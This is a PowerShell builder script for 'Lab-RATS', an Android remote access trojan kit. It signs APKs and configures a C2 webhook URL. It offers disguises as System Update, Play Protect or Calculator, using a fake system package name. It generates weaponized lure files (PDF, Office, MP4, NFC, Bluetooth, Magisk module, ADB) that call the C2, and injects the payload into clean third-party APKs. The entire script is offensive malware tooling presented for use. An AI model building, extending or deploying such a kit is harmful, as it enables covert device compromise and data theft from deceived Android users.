# ====================================================================
#                   Lab-RATS PowerShell Builder
#                         v1.5.1 Hardened
# ====================================================================
# Developed by K4N3CO © 2026

Param(
    [string]$TargetApk
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir

function Write-Banner {
    Clear-Host
    Write-Host " ┌───────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
    Write-Host " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │" -ForegroundColor Cyan
    Write-Host " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │" -ForegroundColor Cyan
    Write-Host " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │" -ForegroundColor Cyan
    Write-Host " │                         DEVELOPED BY K4N3CO                           │" -ForegroundColor Cyan
    Write-Host " └───────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
    Write-Host ""
}

function Test-Requirements {
    Write-Host "[*] Checking requirements..." -ForegroundColor Cyan

    if (-not (Get-Command java -ErrorAction SilentlyContinue)) {
        Write-Host "[!] Java JDK 17/21 is required." -ForegroundColor Red
        return $false
    }
    Write-Host "[OK] Java detected" -ForegroundColor Green
    return $true
}

function New-Keystore {
    $keystorePath = Join-Path $ProjectDir "lab-rats-keystore.jks"
    if (Test-Path $keystorePath) {
        Write-Host "[!] Keystore already exists." -ForegroundColor Yellow
        $choice = Read-Host "    Generate new keystore? (y/N)"
        if ($choice -notmatch "[yY]") { return }
        Remove-Item $keystorePath -Force
    }

    $alias = Read-Host "    Key alias [lab-rats-key]"
    if ([string]::IsNullOrEmpty($alias)) { $alias = "lab-rats-key" }
    $pass = Read-Host "    Password [lab-rats123]"
    if ([string]::IsNullOrEmpty($pass)) { $pass = "lab-rats123" }

    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>$null

    $props = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
    Set-Content (Join-Path $ProjectDir "keystore.properties") $props
    Write-Host "[OK] Keystore ready" -ForegroundColor Green
}

function Set-AppConfig {
    Write-Host "[*] App Configuration" -ForegroundColor Cyan
    $appName = Read-Host "    Enter App Name [System Stability Service]"
    if ([string]::IsNullOrEmpty($appName)) { $appName = "System Stability Service" }
    
    $pkgName = Read-Host "    Enter Package ID [com.android.system.stability]"
    if ([string]::IsNullOrEmpty($pkgName)) { $pkgName = "com.android.system.stability" }

    $verName = Read-Host "    Enter Version Name [1.0.0]"
    if ([string]::IsNullOrEmpty($verName)) { $verName = "1.0.0" }

    $minSdk = Read-Host "    Enter Min SDK [21]"
    if ([string]::IsNullOrEmpty($minSdk)) { $minSdk = 21 }

    Write-Host "`n[*] Decoy Identity Selection" -ForegroundColor Cyan
    Write-Host "    1. System Update (Gear)  2. Calculator"
    Write-Host "    3. Weather               4. Play Protect"
    Write-Host "    5. Lab-RATS Logo"
    $decoyChoice = Read-Host "    Choice (Default 1)"
    if ([string]::IsNullOrEmpty($decoyChoice)) { $decoyChoice = "1" }

    $localProps = Join-Path $ProjectDir "local.properties"
    $existingWebhook = ""
    if (Test-Path $localProps) {
        $lines = Get-Content $localProps
        foreach ($l in $lines) {
            if ($l -like "WEBHOOK_URL=*") { $existingWebhook = $l.Split("=")[1] }
        }
    }

    if ($existingWebhook) {
        Write-Host "    Current Webhook URL: $existingWebhook" -ForegroundColor Yellow
        $webhookUrl = Read-Host "    Enter C2 Webhook URL [Press Enter to Keep Current]"
        if ([string]::IsNullOrEmpty($webhookUrl)) { $webhookUrl = $existingWebhook }
    } else {
        $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
    }

    $newProps = @()
    if (Test-Path $localProps) {
        foreach ($line in Get-Content $localProps) {
            if ($line -notlike "WEBHOOK_URL=*" -and $line -notlike "DECOY_CHOICE=*") {
                $newProps += $line
            }
        }
    }
    $newProps += "WEBHOOK_URL=$webhookUrl"
    $newProps += "DECOY_CHOICE=$decoyChoice"
    Set-Content $localProps ($newProps -join "`n")

    Write-Host "[OK] Configuration applied" -ForegroundColor Green
}

function Build-Apk {
    Write-Banner
    Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan

    Set-Location $ProjectDir
    & .\gradlew.bat clean assembleRelease --no-daemon

    $outputDir = Join-Path $ScriptDir "output"
    if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }

    $apkPath = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release.apk"
    if (Test-Path $apkPath) {
        Copy-Item $apkPath (Join-Path $outputDir "signed_v1.apk") -Force
        Write-Host "`n[OK] Build successful: apk-builder/output/signed_v1.apk" -ForegroundColor Green
    } else {
        Write-Host "`n[!] Build failed." -ForegroundColor Red
    }

    Set-Location $ScriptDir
    Read-Host "    Press Enter to continue"
}

function New-ExploitStandalone([string]$Type, [string]$Url, [string]$Extra) {
    $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
    $tempBin = Join-Path $ScriptDir "bin"
    if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }

    & javac -sourcepath (Join-Path $ProjectDir "app\src\main\java") -d $tempBin $exploitSrc 2>$null
    if ($LASTEXITCODE -eq 0) {
        $outDir = Join-Path $ScriptDir "output"
        if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
        Set-Location $outDir
        & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
        Set-Location $ScriptDir
    } else {
        Write-Host "[!] Exploit compilation failed." -ForegroundColor Red
    }
}

function Show-ExploitLab {
    Write-Banner
    Write-Host "[>] Weaponized Payload Lab (Hardened Tier)" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "    1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite"
    Write-Host "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
    Write-Host "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
    Write-Host "    10. Office Word      11. Office Excel   12. Ghost GIF"
    Write-Host "    13. Priv-App Magisk Module ZIP"
    Write-Host "    14. Return to Main Menu"
    Write-Host ""
    $e = Read-Host "    Choice"

    $c2Url = "http://127.0.0.1:8080"
    $localProps = Join-Path $ProjectDir "local.properties"
    if (Test-Path $localProps) {
        $props = Get-Content $localProps
        foreach ($line in $props) {
            if ($line -like "WEBHOOK_URL=*") { $c2Url = $line.Split("=")[1] }
        }
    }

    switch ($e) {
        "1" { New-ExploitStandalone "mp4" $c2Url "" }
        "2" { $t = Read-Host "    Enter PDF Title"; New-ExploitStandalone "pdf" $c2Url $t }
        "3" { $s = Read-Host "    Enter Meeting Summary"; New-ExploitStandalone "ics" $c2Url $s }
        "4" { New-ExploitStandalone "dolby" $c2Url "" }
        "5" { $ip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $c2Url $ip }
        "6" { New-ExploitStandalone "vcf" $c2Url "Android Update" }
        "7" { New-ExploitStandalone "ndef" $c2Url "uri" }
        "8" { New-ExploitStandalone "stego" $c2Url "" }
        "9" { New-ExploitStandalone "pwa" $c2Url "SystemUpdate" }
        "10" { New-ExploitStandalone "docx" $c2Url "Security_Audit" }
        "11" { New-ExploitStandalone "xlsx" $c2Url "Financial_Report" }
        "12" { New-ExploitStandalone "gif" $c2Url "" }
        "13" { New-ExploitStandalone "privapp" $c2Url "" }
        "14" { return }
    }
    Write-Host ""
    Read-Host "    Press Enter to return to Lab"
    Show-ExploitLab
}

function Show-Help {
    Write-Banner
    Write-Host "COMMAND_DOCUMENTATION_V1.5.1" -ForegroundColor White
    Write-Host "------------------------------------------------------------"
    Write-Host "1. Start Build: Standard production flow."
    Write-Host "2. Keystore Only: Unique signing certificate."
    Write-Host "3. App Settings: Change ID, Name, and Version."
    Write-Host "4. Requirements: Check Java setup."
    Write-Host "5. Infection Wizard: Full Build -> Host -> Weaponize."
    Write-Host "6. Exploit Lab: Generate standalone tactical vectors."
    Write-Host "7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK."
    Write-Host "------------------------------------------------------------"
    Read-Host "    Press Enter to return"
}

function Show-MainMenu {
    while ($true) {
        Write-Banner
        Write-Host "[>] Build Options:" -ForegroundColor Magenta
        Write-Host ""
        Write-Host "    1. Start Build (Configure & Build)"
        Write-Host "    2. Generate Keystore Only"
        Write-Host "    3. Configure App Settings Only"
        Write-Host "    4. Check Requirements"
        Write-Host "    5. Weaponized Payload Lab"
        Write-Host "    6. Generate Infection Chain Package (Wizard)"
        Write-Host "    7. Smali Surgery & APK Binder (Infect Clean APK)"
        Write-Host "    8. Help / Documentation"
        Write-Host "    9. Exit"
        Write-Host ""
        $choice = Read-Host "    Choice (Default 1)"
        if ([string]::IsNullOrEmpty($choice)) { $choice = "1" }

        switch ($choice) {
            "1" { if (Test-Requirements) { New-Keystore; Set-AppConfig; Build-Apk } }
            "2" { if (Test-Requirements) { New-Keystore } }
            "3" { Set-AppConfig }
            "4" { Test-Requirements | Out-Null; Read-Host "    Press Enter to return" | Out-Null }
            "5" { Show-ExploitLab }
            "6" { Show-ExploitLab }
            "7" { & powershell -ExecutionPolicy Bypass -File (Join-Path $ScriptDir "bind.ps1"); Read-Host "    Press Enter to return" }
            "8" { Show-Help }
            "9" { exit 0 }
        }
    }
}

Show-MainMenu
